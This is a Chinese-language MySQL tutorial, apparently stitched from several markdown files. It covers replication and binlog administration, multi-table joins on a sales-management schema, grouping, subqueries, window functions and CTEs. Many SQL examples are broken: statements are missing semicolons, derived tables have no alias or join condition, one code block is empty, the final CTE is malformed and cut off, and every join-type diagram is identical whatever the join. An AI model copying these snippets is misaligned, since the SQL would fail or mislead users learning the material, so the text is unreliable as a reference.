STOP REPLICA IO_THREAD;
STOP REPLICA SQL_THREAD;
```

**基本写法：重置副本**
`RESET REPLICA [ALL] [FOR CHANNEL '<通道名>'];`

```sql
-- 清除副本元数据与中继日志（替换旧 RESET SLAVE）
RESET REPLICA;
-- 彻底删除通道（含元数据）
RESET REPLICA ALL FOR CHANNEL 'source_1';
```

**基本写法：配置复制源**
`CHANGE REPLICATION SOURCE TO SOURCE_HOST='<主机>', SOURCE_PORT=<端口>, SOURCE_USER='<用户>', SOURCE_PASSWORD='<密码>', SOURCE_LOG_FILE='<日志文件>', SOURCE_LOG_POS=<位置>;`

```sql
-- 配置主从复制源（8.4 新语法，替代 CHANGE MASTER TO）
CHANGE REPLICATION SOURCE TO
  SOURCE_HOST='192.168.1.100',
  SOURCE_PORT=3306,
  SOURCE_USER='repl',
  SOURCE_PASSWORD='ReplPass123!',
  SOURCE_LOG_FILE='mysql-bin.000003',
  SOURCE_LOG_POS=1234,
  GET_SOURCE_PUBLIC_KEY=1;
```

---

## 二进制日志管理

**基本写法：查看二进制日志列表**
`SHOW BINARY LOGS;`

```sql
-- 查看所有 binlog 文件及大小
SHOW BINARY LOGS;
```

**基本写法：查看 binlog 事件**
`SHOW BINLOG EVENTS [IN '<日志文件>'] [FROM <位置>] [LIMIT <偏移>, <行数>];`

```sql
-- 查看指定 binlog 事件
SHOW BINLOG EVENTS IN 'mysql-bin.000003' FROM 1234 LIMIT 10;
```

**基本写法：查看 binlog 格式**
`SHOW VARIABLES LIKE 'binlog_format';`

```sql
-- 查看 binlog 格式（ROW/STATEMENT/MIXED）
SHOW VARIABLES LIKE 'binlog_format';
```

**基本写法：删除旧 binlog**
`PURGE BINARY LOGS TO '<保留文件>';`

```sql
-- 删除指定文件之前的所有 binlog
PURGE BINARY LOGS TO 'mysql-bin.000010';
```

**基本写法：按时间删除 binlog**
`PURGE BINARY LOGS BEFORE '<日期时间>';`

```sql
-- 删除指定时间之前的 binlog
PURGE BINARY LOGS BEFORE '2024-12-01 00:00:00';
```

**基本写法：自动过期配置**
`SET GLOBAL binlog_expire_logs_seconds = <秒数>;`

```sql
-- 设置 binlog 自动过期（默认 30 天）
SET GLOBAL binlog_expire_logs_seconds = 604800;  -- 7 天
```

---

## binlog 工具

**基本写法：mysqlbinlog 查看日志**
`mysqlbinlog <选项> <日志文件>`

```bash
# 查看二进制日志内容
mysqlbinlog mysql-bin.000003
# 指定时间范围
mysqlbinlog --start-datetime="2024-12-01 00:00:00" --stop-datetime="2024-12-02 00:00:00" mysql-bin.000003
```

**基本写法：mysqlbinlog 重放恢复**
`mysqlbinlog <日志文件> | mysql -u <用户名> -p <数据库名>`

```bash
# 基于位置恢复
mysqlbinlog --start-position=1234 --stop-position=5678 mysql-bin.000003 | mysql -u root -p mydb
```

**基本写法：基于 GTID 恢复**
`mysqlbinlog --exclude-gtids='<GTID集合>' <日志文件>`

```bash
# 排除指定 GTID 事务进行恢复
mysqlbinlog --exclude-gtids='3E11FA47-71CA-11E1-9E33-C80AA9429562:1-5' mysql-bin.000003 | mysql -u root -p
```

---

## 复制过滤

**基本写法：配置复制过滤规则**
`CHANGE REPLICATION FILTER <过滤类型> = (<规则>);`

```sql
-- 仅复制指定库
CHANGE REPLICATION FILTER REPLICATE_DO_DB = (mydb);
-- 排除指定库
CHANGE REPLICATION FILTER REPLICATE_IGNORE_DB = (test, tmp);
-- 仅复制指定表
CHANGE REPLICATION FILTER REPLICATE_DO_TABLE = (mydb.users, mydb.orders);
```

<!-- ============ 文档分隔线：020-mysql/043-AdvancedQueryMultiTableOperation.md ============ -->

## 1. 多表联查 (Joins)

### 1.1 基本联查类型

#### 1.1.1 联查类型总览

| 联查类型       | 描述     | 返回结果                          |
| -------------- | -------- | --------------------------------- |
| **INNER JOIN** | 内连接   | 只返回两表匹配的行                |
| **LEFT JOIN**  | 左外连接 | 返回左表所有行，右表不匹配补 NULL |
| **RIGHT JOIN** | 右外连接 | 返回右表所有行，左表不匹配补 NULL |
| **FULL JOIN**  | 全外连接 | 返回两表所有行，不匹配的补 NULL   |

#### 1.1.2 联查类型详解

#### INNER JOIN（内连接）

**作用**：只返回两个表中匹配条件的行。
**语法**：

```sql
 SELECT *
 from table1
 inNER JOIN table2
  ON table1.id = table2.id;
```

**图解**：

```mermaid
flowchart LR
    subgraph A[表A]
        A1[1] A2[2] A3[3] A4[4]
    end
    subgraph B[表B]
        B1[A] B2[B] B3[C]
    end
    A1 --- B1
    A2 --- B2
    A3 --- B3
```

**特点**：只有两边都匹配的数据才会出现在结果中。

---

#### LEFT JOIN（左外连接）

**作用**：返回左表的所有行，以及右表中匹配的行；右表不匹配的部分用 NULL 填充。
**语法**：

```sql
 SELECT *
 from table1
 LEFT JOIN table2
  ON table1.id = table2.id;
```

**图解**：

```mermaid
flowchart LR
    subgraph A[表A]
        A1[1] A2[2] A3[3] A4[4]
    end
    subgraph B[表B]
        B1[A] B2[B] B3[C]
    end
    A1 --- B1
    A2 --- B2
    A3 --- B3
```

**特点**：左表的数据全部保留，右表没有匹配的用 NULL 填充。

---

#### RIGHT JOIN（右外连接）

**作用**：返回右表的所有行，以及左表中匹配的行；左表不匹配的部分用 NULL 填充。
**语法**：

```sql
 SELECT *
 from table1
 RIGHT JOIN table2
  ON table1.id = table2.id;
```

**图解**：

```mermaid
flowchart LR
    subgraph A[表A]
        A1[1] A2[2] A3[3] A4[4]
    end
    subgraph B[表B]
        B1[A] B2[B] B3[C]
    end
    A1 --- B1
    A2 --- B2
    A3 --- B3
```

**特点**：右表的数据全部保留，左表没有匹配的用 NULL 填充。

---

#### FULL JOIN（全外连接）

**作用**：返回两个表的所有行，不匹配的部分用 NULL 填充。
**注意**：MySQL 不直接支持 FULL JOIN，需要通过 `UNION` 模拟。
**语法**：

```sql
 SELECT *
 from table1
 LEFT JOIN table2
  ON table1.id = table2.id
 UNION
 SELECT *
 from table1
 RIGHT JOIN table2
  ON table1.id = table2.id;
```

**图解**：

```mermaid
flowchart LR
    subgraph A[表A]
        A1[1] A2[2] A3[3] A4[4]
    end
    subgraph B[表B]
        B1[A] B2[B] B3[C]
    end
    A1 --- B1
    A2 --- B2
    A3 --- B3
```

**特点**：两个表的数据全部保留，没有匹配的用 NULL 填充。

### 1.2 联查示例

**示例表结构**:

```sql
 CREATE TABLE departments (
  dept_id INT PRIMARY KEY,
  dept_name VARCHAR(50) NOT NULL
 )
 CREATE TABLE employees (
  emp_id INT PRIMARY KEY,
  emp_name VARCHAR(50) NOT NULL,
  dept_id INT,
  salary DECIMAL(10, 2),
  hire_date DATE,
  FOREIGN KEY (dept_id) REFERENCES departments(dept_id)
 )
 inSERT INTO departments VALUES (1, '技术部'), (2, '市场部'), (3, '财务部');
 inSERT INTO employees VALUES
 (1, '张三', 1, 8000, '2020-01-01'),
 (2, '李四', 1, 9000, '2020-02-01'),
 (3, '王五', 2, 7000, '2020-03-01'),
 (4, '赵六', 2, 6000, '2020-04-01'),
 (5, '钱七', 3, 10000, '2020-05-01');
```

**INNER JOIN 示例**:

```sql
 SELECT e.emp_id, e.emp_name, d.dept_name, e.salary
 from employees e
 inNER JOIN departments d ON e.dept_id = d.dept_id;
```

**LEFT JOIN 示例**:

```sql
 SELECT d.dept_id, d.dept_name, e.emp_name, e.salary
 from departments d
 LEFT JOIN employees e ON d.dept_id = e.dept_id;
```

**RIGHT JOIN 示例**:

```sql
 SELECT e.emp_id, e.emp_name, d.dept_name, e.salary
 from departments d
 RIGHT JOIN employees e ON d.dept_id = e.dept_id;
```

**FULL JOIN 模拟**:

```sql
 SELECT d.dept_id, d.dept_name, e.emp_name, e.salary
 from departments d
 LEFT JOIN employees e ON d.dept_id = e.dept_id
 UNION
 SELECT d.dept_id, d.dept_name, e.emp_name, e.salary
 from departments d
 RIGHT JOIN employees e ON d.dept_id = e.dept_id;
```

### 1.3 多表联查实战（商品管理系统）

以下示例基于商品管理系统数据库，包含完整的多表联查实战场景：

```sql
```

**实战示例1：查询员工及其销售订单**

```sql
 SELECT
  e.Employees_id,
  e.Employees_name,
  s.Sales_id,
  s.Sales_time,
  s.Customer_id
 from employees_info e
 inNER JOIN sales_info s
  ON e.Employees_id = s.Employees_id;
```

**实战示例2：查询员工销售订单详情（含客户信息）**

```sql
 SELECT
  e.Employees_name,
  s.Sales_id,
  c.Customer_name,
  c.Telephone,
  s.Sales_time
 from employees_info e
 inNER JOIN sales_info s
  ON e.Employees_id = s.Employees_id
 inNER JOIN customer_info c
  ON s.Customer_id = c.Customer_id;
```

**实战示例3：查询完整订单信息（五表联查）**

```sql
 SELECT
  e.Employees_name AS 员工姓名,
  s.Sales_id AS 订单编号,
  c.Customer_name AS 客户姓名,
  m.Commodity_name AS 商品名称,
  sl.Sales_price AS 销售单价,
  sl.Sales_Number AS 销售数量,
  sl.Sales_price * sl.Sales_Number AS 小计金额,
  s.Sales_time AS 销售时间
 from employees_info e
 inNER JOIN sales_info s
  ON e.Employees_id = s.Employees_id
 inNER JOIN customer_info c
  ON s.Customer_id = c.Customer_id
 inNER JOIN sales_list sl
  ON s.Sales_id = sl.Sales_id
 inNER JOIN commodity_info m
  ON sl.Commodity_id = m.Commodity_id
 ORDER BY s.Sales_time DESC;
```

**实战示例4：统计各销售员的销售业绩**

```sql
 SELECT
  e.Employees_name AS 销售员,
  COUNT(DISTINCT s.Sales_id) AS 订单数,
  SUM(sl.Sales_Number) AS 销售总量,
  SUM(sl.Sales_price * sl.Sales_Number) AS 销售总业绩
 from employees_info e
 inNER JOIN sales_info s
  ON e.Employees_id = s.Employees_id
 inNER JOIN sales_list sl
  ON s.Sales_id = sl.Sales_id
 GROUP BY e.Employees_id, e.Employees_name
 ORDER BY 销售总业绩 DESC;
```

**实战示例5：查询客户购买的商品明细**

```sql
 SELECT
  c.Customer_name AS 客户姓名,
  m.Commodity_name AS 商品名称,
  SUM(sl.Sales_Number) AS 购买数量,
  SUM(sl.Sales_price * sl.Sales_Number) AS 消费金额
 from customer_info c
 inNER JOIN sales_info s
  ON c.Customer_id = s.Customer_id
 inNER JOIN sales_list sl
  ON s.Sales_id = sl.Sales_id
 inNER JOIN commodity_info m
  ON sl.Commodity_id = m.Commodity_id
 GROUP BY c.Customer_id, c.Customer_name, m.Commodity_name
 ORDER BY c.Customer_name, 消费金额 DESC;
```

**实战示例6：自连接查询 - 查询同名员工**

```sql
 SELECT
  e1.Employees_name AS 姓名,
  e1.Employees_id AS 员工ID1,
  e2.Employees_id AS 员工ID2
 from employees_info e1
 inNER JOIN employees_info e2
  ON e1.Employees_name = e2.Employees_name
 WHERE e1.Employees_id < e2.Employees_id;
```

**实战示例7：自连接查询 - 同城市供应商**

```sql
 SELECT
  s1.Supplier_name AS 供应商1,
  s1.Address AS 城市,
  s2.Supplier_name AS 同城市供应商
 from supplier_info s1
 inNER JOIN supplier_info s2
  ON s1.Address = s2.Address
 WHERE s1.Supplier_id <> s2.Supplier_id
 ORDER BY s1.Address, s1.Supplier_name;
```

**外连接实战示例1：查询所有员工及他们的销售记录**

```sql
 SELECT
  e.Employees_name,
  s.Sales_id,
  s.Sales_time
 from employees_info e
 LEFT JOIN sales_info s
  ON e.Employees_id = s.Employees_id;
```

**外连接实战示例2：统计每种商品的销量（包含未销售的商品）**

```sql
 SELECT
  c.Commodity_name,
  IFNULL(SUM(sl.Sales_Number), 0) AS 销售数量
 from commodity_info c
 LEFT JOIN sales_list sl
  ON c.Commodity_id = sl.Commodity_id
 GROUP BY c.Commodity_id, c.Commodity_name
 ORDER BY 销售数量 DESC;
```

**外连接实战示例3：查询采购信息（包含没有采购的商品）**

```sql
 SELECT
  c.Commodity_name,
  pi.Purchase_id,
  pi.Purchase_time,
  pl.Purchase_Number,
  pl.Purchase_price,
  su.Supplier_name,
  e.Employees_name
 from commodity_info c
 LEFT JOIN purchase_list pl
  ON c.Commodity_id = pl.Commodity_id
 LEFT JOIN purchase_info pi
  ON pl.Purchase_id = pi.Purchase_id
 LEFT JOIN supplier_info su
  ON pi.Supplier_id = su.Supplier_id
 LEFT JOIN employees_info e
  ON pi.Employees_id = e.Employees_id;
```

**外连接实战示例4：查询有销售记录的员工**

```sql
 SELECT DISTINCT
  e.Employees_name
 from employees_info e
 RIGHT JOIN sales_info s
  ON e.Employees_id = s.Employees_id
 WHERE e.Employees_id IS NOT NULL;
```

### 1.4 其他连接类型

#### 1.4.1 交叉连接 (CROSS JOIN)

返回两个表的笛卡尔积：

```sql
 SELECT * FROM table1 CROSS JOIN table2;
 SELECT * FROM table1, table2;
 SELECT d.dept_name, e.emp_name
 from departments d
 CROSS JOIN employees e;
```

#### 1.4.2 自然连接 (NATURAL JOIN)

自动根据相同列名进行连接：

```sql
 SELECT * FROM employees NATURAL JOIN departments;
 SELECT * FROM employees NATURAL LEFT JOIN departments;
 SELECT * FROM employees NATURAL RIGHT JOIN departments;
```

#### 1.4.3 USING 子句

当两个表有相同列名时，可以使用 USING 简化连接：

```sql
 SELECT e.emp_name, d.dept_name
 from employees e
 JOIN departments d USING (dept_id);
```

### 1.5 连接优先级与括号

```sql
 SELECT *
 from employees e
 LEFT JOIN (
  departments d
  JOIN projects p ON d.dept_id = p.dept_id
 )
```

## 2. 分组统计 (Grouping)

### 2.1 基本分组

使用 `GROUP BY` 配合聚合函数进行分组统计：

```sql
 SELECT dept_id, AVG(salary) as avg_salary
 from employees
 GROUP BY dept_id;
```

### 2.2 HAVING 子句

`HAVING` 用于对分组后的结果进行过滤，而 `WHERE` 是在分组前过滤：

```sql
 SELECT dept_id, AVG(salary) as avg_salary
 from employees
 GROUP BY dept_id
 HAVING AVG(salary) > 7000;
```

### 2.3 多列分组

```sql
 SELECT dept_id, YEAR(hire_date) as hire_year, AVG(salary) as avg_salary
 from employees
 GROUP BY dept_id, YEAR(hire_date);
```

### 2.4 常用聚合函数

| 聚合函数         | 描述         | 示例                                                  |
| ---------------- | ------------ | ----------------------------------------------------- |
| `COUNT()`        | 计算行数     | `COUNT(*)`、`COUNT(column)`、`COUNT(DISTINCT column)` |
| `SUM()`          | 计算数值总和 | `SUM(price)`、`SUM(quantity * price)`                 |
| `AVG()`          | 计算平均值   | `AVG(salary)`、`AVG(DISTINCT price)`                  |
| `MAX()`          | 计算最大值   | `MAX(price)`、`MAX(created_at)`                       |
| `MIN()`          | 计算最小值   | `MIN(price)`、`MIN(created_at)`                       |
| `GROUP_CONCAT()` | 拼接字符串   | `GROUP_CONCAT(name SEPARATOR ',')`                    |

```sql
 SELECT
  COUNT(*) as total_employees,
  SUM(salary) as total_salary,
  AVG(salary) as avg_salary,
  MAX(salary) as max_salary,
  MIN(salary) as min_salary
 from employees;
```

### 2.5 ROLLUP 和 CUBE

#### 2.5.1 ROLLUP

生成小计和总计：

```sql
 SELECT
  dept_id,
  YEAR(hire_date) as hire_year,
  COUNT(*) as employee_count
 from employees
 GROUP BY dept_id, YEAR(hire_date) WITH ROLLUP;
```

#### 2.5.2 GROUPING SETS

灵活指定分组组合：

```sql
 SELECT
  dept_id,
  YEAR(hire_date) as hire_year,
  COUNT(*) as employee_count
 from employees
 GROUP BY GROUPING SETS (
  (dept_id, YEAR(hire_date)), -- 部门+年份
  (dept_id), -- 仅部门
  () -- 总计
 )
```

### 2.6 GROUP_CONCAT 的高级用法

```sql
 SELECT
  dept_id,
  GROUP_CONCAT(emp_name SEPARATOR ', ') as employees
 from employees
 GROUP BY dept_id;
 SELECT
  dept_id,
  GROUP_CONCAT(emp_name ORDER BY salary DESC SEPARATOR ', ') as employees
 from employees
 GROUP BY dept_id;
```

## 3. 子查询 (Subqueries)

### 3.1 标量子查询

返回单一值的子查询：

```sql
 SELECT emp_name, salary
 from employees
 WHERE salary > (SELECT AVG(salary) FROM employees);
```

### 3.2 列子查询

返回一列值的子查询，通常配合 `IN`, `ANY`, `ALL` 使用：

```sql
 SELECT emp_name, dept_id
 from employees
 WHERE dept_id IN (SELECT dept_id FROM departments WHERE dept_name IN ('技术部', '市场部'));
```

### 3.3 行子查询

返回一行多列的子查询：

```sql
 SELECT emp_name, dept_id, salary
 from employees
 WHERE (dept_id, salary) = (SELECT dept_id, salary FROM employees WHERE emp_name = '张三');
```

### 3.4 表子查询

返回一个表的子查询，可以作为临时表使用：

```sql
 SELECT e.emp_name, e.dept_id, e.salary
 from employees e
 JOIN (
  SELECT dept_id, MAX(salary) as max_salary
  FROM employees
  GROUP BY dept_id
 )
```

### 3.5 相关子查询

子查询中使用了外部查询的列：

```sql
 SELECT
  emp_name,
  dept_id,
  salary,
  (SELECT COUNT(*) + 1
  FROM employees e2
  WHERE e2.dept_id = e1.dept_id AND e2.salary > e1.salary) as rank
 from employees e1
 ORDER BY dept_id, rank;
```

### 3.6 EXISTS 子查询

检查子查询是否返回任何行：

```sql
 SELECT dept_id, dept_name
 from departments d
 WHERE EXISTS (
  SELECT 1 FROM employees e WHERE e.dept_id = d.dept_id
 )
 SELECT dept_id, dept_name
 from departments d
 WHERE NOT EXISTS (
  SELECT 1 FROM employees e WHERE e.dept_id = d.dept_id
 )
 SELECT dept_id, dept_name
 from departments d
 WHERE EXISTS (
  SELECT 1 FROM employees e
  WHERE e.dept_id = d.dept_id AND e.salary > 8000
 )
```

### 3.7 ANY/SOME 和 ALL

```sql
 SELECT emp_name, salary
 from employees
 WHERE salary > ANY (
  SELECT AVG(salary) FROM employees GROUP BY dept_id
 )
 SELECT emp_name, salary
 from employees
 WHERE salary > ALL (
  SELECT AVG(salary) FROM employees GROUP BY dept_id
 )
 SELECT emp_name, salary
 from employees
 WHERE salary > SOME (
  SELECT AVG(salary) FROM employees GROUP BY dept_id
 )
```

### 3.8 子查询的性能考虑

```sql
 SELECT e.emp_name, e.salary
 from employees e
 JOIN (SELECT AVG(salary) as avg_sal FROM employees) t
 WHERE e.salary > t.avg_sal;
 SELECT emp_name, salary
 from employees e1
 WHERE salary > (SELECT AVG(salary) FROM employees e2 WHERE e2.dept_id = e1.dept_id);
```

## 4. 窗口函数 (Window Functions - MySQL 8.0+)

窗口函数允许在不分组的情况下进行聚合计算，为每行数据生成一个结果。

### 4.1 基本语法

```sql
 <窗口函数> OVER (
  [PARTITION BY <分区列>]
  [ORDER BY <排序列>]
  [ROWS/RANGE <窗口范围>]
 )
```

### 4.2 常用窗口函数

#### 4.2.1 排名函数

| 函数           | 描述                 | 相同值处理                     | 示例结果（假设两行值相同） |
| -------------- | -------------------- | ------------------------------ | -------------------------- |
| `ROW_NUMBER()` | 为每行分配唯一的序号 | 即使值相同也分配不同序号       | 1, 2                       |
| `RANK()`       | 相同值会有相同的排名 | 相同值排名相同，后续排名跳过   | 1, 1, 3（跳过2）           |
| `DENSE_RANK()` | 相同值会有相同的排名 | 相同值排名相同，后续排名不跳过 | 1, 1, 2                    |

**示例**:

```sql
 SELECT
  emp_name,
  dept_id,
  salary,
  ROW_NUMBER() OVER (PARTITION BY dept_id ORDER BY salary DESC) as row_num,
  RANK() OVER (PARTITION BY dept_id ORDER BY salary DESC) as rank,
  DENSE_RANK() OVER (PARTITION BY dept_id ORDER BY salary DESC) as dense_rank
 from employees;
```

#### 4.2.2 聚合函数作为窗口函数

```sql
 SELECT
  emp_name,
  dept_id,
  salary,
  SUM(salary) OVER (PARTITION BY dept_id ORDER BY salary) as cumulative_salary,
  AVG(salary) OVER (PARTITION BY dept_id) as dept_avg_salary,
  MAX(salary) OVER (PARTITION BY dept_id) as dept_max_salary
 from employees;
```

#### 4.2.3 分析函数

| 函数            | 描述                   | 语法示例               | 说明                   |
| --------------- | ---------------------- | ---------------------- | ---------------------- |
| `LAG()`         | 获取前 N 行的值        | `LAG(salary, 1)`       | 获取上一行的 salary 值 |
| `LEAD()`        | 获取后 N 行的值        | `LEAD(salary, 2)`      | 获取下两行的 salary 值 |
| `FIRST_VALUE()` | 获取窗口内的第一个值   | `FIRST_VALUE(salary)`  | 获取分组内的第一个值   |
| `LAST_VALUE()`  | 获取窗口内的最后一个值 | `LAST_VALUE(salary)`   | 获取分组内的最后一个值 |
| `NTH_VALUE()`   | 获取窗口内第 N 个值    | `NTH_VALUE(salary, 3)` | 获取分组内的第三个值   |

**示例**:

```sql
 SELECT
  emp_name,
  dept_id,
  salary,
  LAG(salary, 1) OVER (PARTITION BY dept_id ORDER BY salary) as prev_salary,
  salary - LAG(salary, 1) OVER (PARTITION BY dept_id ORDER BY salary) as salary_diff
 from employees;
```

### 4.3 窗口范围

```sql
 SELECT
  emp_name,
  dept_id,
  salary,
  SUM(salary) OVER (
  PARTITION BY dept_id
  ORDER BY salary
  ROWS BETWEEN 1 PRECEDING AND 1 FOLLOWING
  ) as moving_sum
 from employees;
```

### 4.4 其他常用窗口函数

#### 4.4.1 百分比排名函数

```sql
 SELECT
  emp_name,
  dept_id,
  salary,
  PERCENT_RANK() OVER (PARTITION BY dept_id ORDER BY salary DESC) as percent_rank
 from employees;
 SELECT
  emp_name,
  dept_id,
  salary,
  CUME_DIST() OVER (PARTITION BY dept_id ORDER BY salary) as cume_dist
 from employees;
```

#### 4.4.2 NTILE 函数

```sql
 SELECT
  emp_name,
  dept_id,
  salary,
  NTILE(2) OVER (PARTITION BY dept_id ORDER BY salary DESC) as bucket
 from employees;
```

#### 4.4.3 LAG 和 LEAD 的高级用法

```sql
 SELECT
  emp_name,
  dept_id,
  salary,
  LAG(salary, 1, 0) OVER (PARTITION BY dept_id ORDER BY salary) as prev_salary,
  LEAD(salary, 1, 0) OVER (PARTITION BY dept_id ORDER BY salary) as next_salary
 from employees;
 SELECT
  emp_name,
  dept_id,
  salary,
  ROUND((salary - LAG(salary) OVER (PARTITION BY dept_id ORDER BY salary))
  / LAG(salary) OVER (PARTITION BY dept_id ORDER BY salary) * 100, 2)
  as growth_rate
 from employees;
```

### 4.5 命名窗口

```sql
 SELECT
  emp_name,
  dept_id,
  salary,
  ROW_NUMBER() OVER w as row_num,
  RANK() OVER w as rank,
  DENSE_RANK() OVER w as dense_rank,
  AVG(salary) OVER (PARTITION BY dept_id) as dept_avg
 from employees
 WINDOW w AS (PARTITION BY dept_id ORDER BY salary DESC);
```

## 5. 实际应用示例

### 5.1 复杂查询示例

```sql
 SELECT
  emp_name,
  dept_name,
  salary,
  rank
 from (
  SELECT
  e.emp_name,
  d.dept_name,
  e.salary,
  ROW_NUMBER() OVER (PARTITION BY e.dept_id ORDER BY e.salary DESC) as rank
  FROM employees e
  JOIN departments d ON e.dept_id = d.dept_id
 )
 WHERE rank <= 2;
```

### 5.2 内连接实战 (商品管理系统)

```sql
 SELECT employees_info.Employees_name, post_info.Post_name
 from employees_info
 JOIN post_info ON employees_info.Post_id = post_info.Post_id;
 SELECT commodity_info.Commodity_name, SUM(sales_list.Sales_Number) AS 销售数量
 from commodity_info
 JOIN sales_list ON commodity_info.Commodity_id = sales_list.Commodity_id
 GROUP BY commodity_info.Commodity_name;
 SELECT employees_info.*, sales_info.*
 from employees_info
 inNER JOIN sales_info ON employees_info.Employees_id = sales_info.Employees_id;
 SELECT employees_info.Employees_id, employees_info.Employees_name, employees_info.Employees_sex,
  sales_info.Sales_id, sales_info.Customer_id, sales_info.Sales_time
 from employees_info
 inNER JOIN sales_info ON employees_info.Employees_id = sales_info.Employees_id;
 SELECT employees_info.Employees_id, employees_info.Employees_name, employees_info.Employees_sex,
  sales_info.Sales_id, sales_info.Customer_id, customer_info.Customer_name, sales_info.Sales_time
 from employees_info
 inNER JOIN sales_info ON employees_info.Employees_id = sales_info.Employees_id
 inNER JOIN customer_info ON sales_info.Customer_id = customer_info.Customer_id
 WHERE employees_info.Employees_name = '王小妮';
 SELECT employees_info.Employees_id, employees_info.Employees_name, employees_info.Employees_sex,
  sales_info.Sales_id, sales_info.Customer_id, customer_info.Customer_name, sales_info.Sales_time
 from employees_info, sales_info, customer_info
 WHERE employees_info.Employees_id = sales_info.Employees_id
  AND sales_info.Customer_id = customer_info.Customer_id
  AND employees_info.Employees_name = '王小妮';
 SELECT employees_info.Employees_id, employees_info.Employees_name,
  SUM(sales_list.Sales_price * sales_list.Sales_Number) AS 销售总业绩
 from employees_info
 inNER JOIN sales_info ON employees_info.Employees_id = sales_info.Employees_id
 inNER JOIN sales_list ON sales_info.Sales_id = sales_list.Sales_id
 GROUP BY employees_info.Employees_id, employees_info.Employees_name
 ORDER BY 销售总业绩 DESC;
 SELECT customer_info.Customer_name, commodity_info.Commodity_name,
  SUM(sales_list.Sales_Number) AS 购买数量
 from customer_info
 inNER JOIN sales_info ON customer_info.Customer_id = sales_info.Customer_id
 inNER JOIN sales_list ON sales_info.Sales_id = sales_list.Sales_id
 inNER JOIN commodity_info ON sales_list.Commodity_id = commodity_info.Commodity_id
 GROUP BY customer_info.Customer_name, commodity_info.Commodity_name;
 SELECT employees_info.Employees_name, sales_info.Sales_id, customer_info.Customer_name,
  commodity_info.Commodity_name, sales_info.Sales_time, sales_list.Sales_Number
 from employees_info
 inNER JOIN sales_info ON employees_info.Employees_id = sales_info.Employees_id
 inNER JOIN customer_info ON sales_info.Customer_id = customer_info.Customer_id
 inNER JOIN sales_list ON sales_info.Sales_id = sales_list.Sales_id
 inNER JOIN commodity_info ON sales_list.Commodity_id = commodity_info.Commodity_id;
 SELECT s1.Supplier_name, s1.Address, s2.Supplier_name AS 同城市供应商
 from supplier_info s1
 inNER JOIN supplier_info s2 ON s1.Address = s2.Address
 WHERE s1.Supplier_name = '翔云公司' AND s1.Supplier_id <> s2.Supplier_id;
 SELECT e1.Employees_name, e1.Employees_id, e2.Employees_id AS 同名员工ID
 from employees_info e1
 inNER JOIN employees_info e2 ON e1.Employees_name = e2.Employees_name
 WHERE e1.Employees_name = '王华' AND e1.Employees_id <> e2.Employees_id;
```

### 5.3 外连接实战 (商品管理系统)

```sql
 SELECT Employees_name, b.*
 from employees_info a
 JOIN sales_info b ON a.Employees_id = b.Employees_id;
 SELECT Employees_name, b.*
 from employees_info a
 LEFT JOIN sales_info b ON a.Employees_id = b.Employees_id;
 SELECT Employees_name, b.*
 from sales_info b
 RIGHT JOIN employees_info a ON a.Employees_id = b.Employees_id;
 SELECT Commodity_name, IFNULL(SUM(Sales_Number), 0) AS 销售数量
 from commodity_info a
 LEFT JOIN sales_list b ON a.Commodity_id = b.Commodity_id
 GROUP BY Commodity_name;
 SELECT Commodity_name, Purchase_id, Purchase_time, Purchase_Number, Purchase_price,
  supplier_info.Supplier_name, employees_info.Employees_name
 from commodity_info a
 LEFT JOIN purchase_list b ON a.Commodity_id = b.Commodity_id
 LEFT JOIN purchase_info c ON b.Purchase_id = c.Purchase_id
 LEFT JOIN supplier_info ON c.Supplier_id = supplier_info.Supplier_id
 LEFT JOIN employees_info ON c.Employees_id = employees_info.Employees_id;
```

### 5.4 性能优化建议

1. **使用索引**: 确保联查的连接列和 WHERE 子句中的列有索引
2. **合理使用子查询**: 避免过于复杂的子查询，考虑使用 JOIN 替代
3. **限制返回数据**: 使用 LIMIT 限制返回行数
4. **避免 SELECT \***: 只选择需要的列
5. **使用 EXPLAIN**: 分析查询执行计划，找出性能瓶颈

### 5.5 复杂报表查询示例

```sql
 SELECT
  DATE_FORMAT(s.sales_time, '%Y-%m') as month,
  d.dept_name,
  COUNT(DISTINCT s.sales_id) as order_count,
  SUM(sl.sales_price * sl.sales_number) as total_amount,
  AVG(sl.sales_price * sl.sales_number) as avg_order_amount,
  MAX(sl.sales_price * sl.sales_number) as max_order_amount
 from sales_info s
 JOIN sales_list sl ON s.sales_id = sl.sales_id
 JOIN employees_info e ON s.employees_id = e.employees_id
 JOIN departments d ON e.dept_id = d.dept_id
 GROUP BY month, d.dept_name
 ORDER BY month DESC, total_amount DESC;
 SELECT
  c.customer_name,
  COUNT(DISTINCT s.sales_id) as order_count,
  SUM(sl.sales_number) as total_quantity,
  SUM(sl.sales_price * sl.sales_number) as total_spent,
  ROUND(SUM(sl.sales_price * sl.sales_number) / (SELECT SUM(sl2.sales_price * sl2.sales_number) FROM sales_list sl2) * 100, 2) as percentage
 from customer_info c
 JOIN sales_info s ON c.customer_id = s.customer_id
 JOIN sales_list sl ON s.sales_id = sl.sales_id
 GROUP BY c.customer_id, c.customer_name
 ORDER BY total_spent DESC
 LIMIT 10;
 SELECT
  DATE_FORMAT(s.sales_time, '%Y-%m-%d') as date,
  ci.commodity_name,
  SUM(sl.sales_number) as daily_sales,
  SUM(sl.sales_price * sl.sales_number) as daily_revenue,
  LAG(SUM(sl.sales_number)) OVER (PARTITION BY ci.commodity_id ORDER BY DATE_FORMAT(s.sales_time, '%Y-%m-%d')) as prev_day_sales,
  ROUND((SUM(sl.sales_number) - LAG(SUM(sl.sales_number)) OVER (PARTITION BY ci.commodity_id ORDER BY DATE_FORMAT(s.sales_time, '%Y-%m-%d')))
  / LAG(SUM(sl.sales_number)) OVER (PARTITION BY ci.commodity_id ORDER BY DATE_FORMAT(s.sales_time, '%Y-%m-%d')) * 100, 2) as growth_rate
 from sales_info s
 JOIN sales_list sl ON s.sales_id = sl.sales_id
 JOIN commodity_info ci ON sl.commodity_id = ci.commodity_id
 WHERE s.sales_time >= DATE_SUB(CURDATE(), INTERVAL 7 DAY)
 GROUP BY date, ci.commodity_id, ci.commodity_name
 ORDER BY date, ci.commodity_name;
```

### 5.6 使用 CTE (Common Table Expressions)

```sql
 with monthly_sales AS (
  SELECT
  DATE_FORMAT(sales_time, '%Y-%m') as month,
  SUM(sales_price * sales_number) as total_sales
  FROM sales_info s
  JOIN sales_list sl ON s.sales_id = sl.sales_id
  GROUP BY month
 )
 monthly_growth AS (
  SELECT
  month,
  total_sales,
  LAG(total_sales) OVER (ORDER BY month) as prev_month_sales,
  ROUND((total_sales - LAG(total_sales) OVER (ORDER BY month))
  / LAG(total_sales) OVER (ORDER BY month) * 100, 2) as growth_rate
  FROM monthly_sales
 )
